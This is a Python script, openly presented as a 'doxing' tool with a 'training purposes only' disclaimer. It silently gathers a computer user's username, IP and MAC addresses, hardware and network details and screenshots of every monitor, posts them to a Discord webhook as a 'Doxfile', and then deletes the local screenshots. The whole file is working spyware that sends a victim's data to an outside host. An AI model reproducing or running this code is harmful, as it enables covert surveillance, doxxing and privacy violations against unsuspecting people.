"""
 Never use this script against anyone! It was created for demonstration and training purposes! 
 I assume no liability for any resulting damages!

 Sends a screenshot of all Monitors and all relevant hardware information of the user to a specific webhook link. 
 This can be edited at the end of the script.
 @apt_start_latifi
    """

import os
import socket
import platform
import uuid
import re
import json
import time
import datetime
import getpass

import requests
import psutil
import mss
import mss.tools
from screeninfo import get_monitors

try:
    import GPUtil
    HAVE_GPU = True
except ImportError:
    HAVE_GPU = False

def gather_system_info():
    info = {}

    username = getpass.getuser()
    info["username"] = username

    boot_time_ts = psutil.boot_time()
    now = time.time()
    uptime_seconds = now - boot_time_ts
    days, remainder = divmod(int(uptime_seconds), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    if days > 0:
        uptime_str = f"{days}d {hours}h {minutes}m {seconds}s"
    else:
        uptime_str = f"{hours}h {minutes}m {seconds}s"
    info["uptime"] = uptime_str

    local_ip = socket.gethostbyname(socket.gethostname())
    mac_num = uuid.getnode()
    mac_str = ':'.join(re.findall('..', f'{mac_num:012x}'))
    info["ip"] = local_ip
    info["mac"] = mac_str

    os_name = platform.system()
    os_version = platform.release()
    info["os"] = f"{os_name} {os_version}"

    discs_list = []
    for part in psutil.disk_partitions():
        if part.fstype: 
            usage = psutil.disk_usage(part.mountpoint)
            total_gb = usage.total / (1024**3)
            used_gb = usage.used / (1024**3)
            disc_str = f"{part.mountpoint} {used_gb:.0f}GB/{total_gb:.0f}GB"
            discs_list.append(disc_str)
    if discs_list:
        info["discs"] = "\n".join(discs_list)
    else:
        info["discs"] = "Keine Partitionen gefunden"

    mem = psutil.virtual_memory()
    total_ram_gb = mem.total / (1024**3)
    used_ram_gb = mem.used / (1024**3)
    ram_str = (
        f"Total: {total_ram_gb:.1f} GB\n"
        f"Used: {used_ram_gb:.1f} GB ({mem.percent}%)"
    )
    info["ram"] = ram_str

    cpu_model = platform.processor()
    physical_cores = psutil.cpu_count(logical=False)
    logical_cores = psutil.cpu_count(logical=True)
    cpu_freq = psutil.cpu_freq()
    current_mhz = cpu_freq.current if cpu_freq else 0
    cpu_usage = psutil.cpu_percent(interval=0.2)
    cpu_str = (
        f"Modell: {cpu_model}\n"
        f"Kerne: {physical_cores} / Threads: {logical_cores}\n"
        f"Takt: {current_mhz:.0f} MHz\n"
        f"Auslastung: {cpu_usage:.0f}%"
    )
    info["cpu"] = cpu_str

    if HAVE_GPU:
        gpus = GPUtil.getGPUs()
        if not gpus:
            info["gpu"] = "Keine GPU erkannt"
        else:
            gpu_lines = []
            for i, gpu in enumerate(gpus):
                gpu_name = gpu.name
                mem_used = gpu.memoryUsed
                mem_total = gpu.memoryTotal
                load = gpu.load * 100
                temp = gpu.temperature
                gpu_lines.append(
                    f"GPU {i}: {gpu_name}\n"
                    f"  VRAM: {mem_used:.0f}/{mem_total:.0f} MB\n"
                    f"  Load: {load:.0f}% | Temp: {temp}°C\n"
                )
            info["gpu"] = "\n".join(gpu_lines)
    else:
        info["gpu"] = "GPUtil nicht installiert"

    net_info = psutil.net_if_addrs()
    lines = []
    for iface, addrs in net_info.items():
        ip_list = []
        for addr in addrs:
            if addr.family == socket.AF_INET:
                ip_list.append(addr.address)
        if ip_list:
            lines.append(f"{iface}: " + ", ".join(ip_list))

    if lines:
        info["network"] = "\n".join(lines)
    else:
        info["network"] = "Keine Netzwerk-Interfaces gefunden"

    return info

def take_screenshots(output_dir="src/images"):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    monitors = get_monitors()
    saved_files = []

    with mss.mss() as sct:
        for i, m in enumerate(monitors):
            monitor_region = {
                "left": m.x,
                "top": m.y,
                "width": m.width,
                "height": m.height
            }
            shot = sct.grab(monitor_region)
            filename = os.path.join(output_dir, f"monitor_{i}.png")

            mss.tools.to_png(shot.rgb, shot.size, output=filename)
            saved_files.append(filename)
            print(f"[INFO] Monitor {i} gespeichert: {filename}")

    return saved_files

def send_embed_with_attachments(webhook_url, info_dict, filepaths):
    title = f"Doxfile for  {info_dict['ip']} created"
    fields = []
    fields.append({"name": "Username",         "value": info_dict["username"], "inline": False})
    fields.append({"name": "Uptime",               "value": info_dict["uptime"],   "inline": False})
    fields.append({"name": "IP Address",           "value": info_dict["ip"],       "inline": False})
    fields.append({"name": "MAC Address",          "value": info_dict["mac"],      "inline": False})
    fields.append({"name": "OS / Version",         "value": info_dict["os"],       "inline": False})
    fields.append({"name": "Discs",                "value": info_dict["discs"],    "inline": False})
    fields.append({"name": "RAM",                  "value": info_dict["ram"],      "inline": False})
    fields.append({"name": "CPU",                  "value": info_dict["cpu"],      "inline": False})
    fields.append({"name": "GPU",                  "value": info_dict["gpu"],      "inline": False})
    fields.append({"name": "Network",             "value": info_dict["network"],  "inline": False})

    if filepaths:
        fields.append({"name": "Screenshots", "value": "Angehängt", "inline": False})
    else:
        fields.append({"name": "Screenshots", "value": "Keine gefunden", "inline": False})

    iso_time = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + "Z"
    embed = {
        "title": title,
        "color": 0x5b00c6, 
        "fields": fields,
        "timestamp": iso_time,
        "footer": {
            "text": "Created by @apt_start_latifi",
        },
    }

    payload = {
        "embeds": [embed]
    }

    multipart = {
        "payload_json": (None, json.dumps(payload), "application/json")
    }

    for i, fp in enumerate(filepaths):
        if os.path.exists(fp):
            file_obj = open(fp, "rb")
            multipart[f"file{i}"] = (os.path.basename(fp), file_obj, "image/png")

    response = requests.post(webhook_url, files=multipart)

    for key, val in multipart.items():
        if isinstance(val, tuple) and hasattr(val[1], "close"):
            val[1].close()

    if response.status_code == 200:
        print("[INFO] Embed + Attachments erfolgreich an Discord gesendet.")
        for fp in filepaths:
            if os.path.exists(fp):
                os.remove(fp)
                print(f"[INFO] Datei gelöscht: {fp}")
    else:
        print(f"[FEHLER] {response.status_code} - {response.text}")

def main():
    info_dict = gather_system_info()
    screenshots = take_screenshots("src/images")
    webhook_url = "https://discordapp.com/api/webhooks/PUT-YOUR-WEBHOOK-HERE"
    send_embed_with_attachments(webhook_url, info_dict, screenshots)

if __name__ == "__main__":
    main()



"""
 Never use this script against anyone! It was created for demonstration and training purposes! 
 I assume no liability for any resulting damages!
 @apt_start_latifi
    """